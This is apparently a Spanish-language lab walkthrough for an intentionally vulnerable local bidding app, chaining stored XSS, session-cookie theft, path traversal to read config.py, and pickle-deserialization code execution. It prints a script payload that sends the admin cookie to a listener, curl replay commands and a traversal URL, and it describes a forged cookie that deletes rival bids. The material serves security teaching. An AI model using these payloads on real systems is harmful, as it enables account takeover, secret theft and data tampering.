# INSTRUCTIVO — Como ejecutar la cadena de vulnerabilidades

> Crear base con `python init_db.py`
> Correr App con `python app.py`

> La cadena se recorre en orden: **XSS → robo de sesion → path traversal → RCE**.
> Cada eslabon habilita al siguiente.

---

## Paso 1 — Stored XSS

- **Que es:** inyeccion de HTML/JS persistente. El formulario de propuesta usa un
  **editor de texto enriquecido (Quill)** para dar formato a la oferta (negrita,
  cursiva, listas, enlaces), asi que la descripcion se guarda como **HTML** y el
  panel del admin la renderiza con `{{ p.descripcion | safe }}`
  (`templates/admin_licitacion.html`). El error es del servidor en **confiar** en 
  que el editor del cliente ya limpio el contenido
  y **no sanitiza en el backend** (`app.py`: `descripcion = request.form.get(...)`
  se guarda tal cual) → XSS almacenado.
- **Donde esta:** vector de entrada en `/propuesta/<id>` (campo Descripcion); se
  **dispara** en `/admin/licitacion/<id>` cuando el admin la abre y el HTML crudo
  se renderiza con `| safe`.
- **Como explotarla:** el editor Quill filtra lo que se escribe/pega en la UI, asi
  que hay que **saltear el editor** y mandar el POST directo (curl / DevTools / Burp)
  con el HTML crudo, ya que el servidor no valida nada.
  1. Iniciar sesion como `atacante` / `hack123`.
  2. Enviar el POST mediante la terminal con curl:
      - curl -X POST http://127.0.0.1:5000/propuesta/<id> \
        -b "sesion=<COOKIE_DEL_ATACANTE>" \
        --data-urlencode "razon_social=ACME SA" \
        --data-urlencode "cuit=20-33333333-3" \
        --data-urlencode "monto=999" \
        --data-urlencode "email_contacto=atacante@acme.com" \
        --data-urlencode 'descripcion=<script>fetch("http://127.0.0.1:8000/robo?c="+encodeURIComponent(document.cookie))</script>'
- **Resultado esperado:** al guardarse, el payload queda persistido. Cuando el
  admin abra esa licitacion, el codigo se ejecuta en **su** navegador.

---

## Paso 2 — Robo de cookie / Session Hijacking

- **Que es:** el XSS exfiltra la cookie de sesion del admin porque la cookie
  **no tiene `HttpOnly`** (`app.py`: `set_cookie(..., httponly=False)`), y luego
  se reutiliza (replay) para entrar como admin sin su contrasena.
- **Donde esta:** ejecución de código XSS en `/admin/licitacion/<id>`.
- **Como explotarla:**
  1. Montar el listener del atacante (terminal aparte): python3 -m http.server 8000.
  2. Con el XSS del paso 1 ya cargado, iniciar sesion como `admin` / `admin123`
     y abrir la licitacion afectada (`/admin/licitacion/<id>`).
  3. La cookie del admin aparece en el listener (parametro `?c=`).
     - **Atencion:** 
          - Inicio de cookie: Luego de **3D**
          - Reemplazar: %3D%3D por **==**
  4. **Replay** de la cookie robada:
     - **curl:** `curl -b "sesion=<VALOR_ROBADO>" http://127.0.0.1:5000/admin`
     - **DevTools:** Application → Cookies → `http://127.0.0.1:5000` → editar la
       cookie `sesion` con el valor robado → recargar.
- **Resultado esperado:** navegas como administrador usando solo la cookie
  robada.

---

## Paso 3 — Path Traversal / LFI

- **Que es:** el endpoint de descarga de reportes concatena el nombre de archivo
  sin validarlo, permitiendo salir de la carpeta `reportes/` con `../`.
- **Donde esta:** `/admin/descargar?file=...` en `app.py`
  (`os.path.join("reportes", nombre)` sin sanitizar).
- **Como explotarla** (ya como admin, del paso 2):
  1. Descarga legitima de referencia:
     `http://127.0.0.1:5000/admin/descargar?file=reporte_ejemplo.csv`
  2. Escapar hacia el archivo de configuracion:
     `http://127.0.0.1:5000/admin/descargar?file=../config.py`
- **Resultado esperado:** se obtiene `config.py`, incluida la
  `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` y la ruta de la BD.

---

## Paso 4 — RCE por deserializacion insegura (pickle)

- **Que es:** con la `SECRET_KEY` filtrada se forja una cookie con **firma HMAC
  valida** que contiene un objeto pickle malicioso. El servidor hace
  `pickle.loads()` sobre ella (`session_utils.leer_cookie`) y ejecuta el
  `__reduce__` del objeto → **ejecucion de codigo**.
- **Donde esta:** `session_utils.py` (`pickle.loads(data)`), invocado por
  `app.py` en cada request a traves de `usuario_actual()`.
- **Como explotarla:**
  1. Editar `exploits/4_forjar_cookie_rce.py`:
     - `USERNAME = "atacante"`  (el username propio; el exploit resuelve su ID en la BD).
     - `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` (la obtenida en el paso 3).
  2. Generar y enviar la cookie forjada al servidor en ejecucion: 
     - Generar: python3 exploits/4_forjar_cookie_rce.py
     - Generar y enviar: python3 exploits/4_forjar_cookie_rce.py --enviar
- **Resultado esperado:**
  - El payload resuelve el **ID** del usuario a partir del `USERNAME` y, en cada
    licitacion **abierta** donde ese usuario tiene propuesta, **borra** de la tabla
    `propuestas` las de la competencia con monto **menor** al que oferto el usuario.
    Las licitaciones cerradas y las propuestas propias no se tocan.

---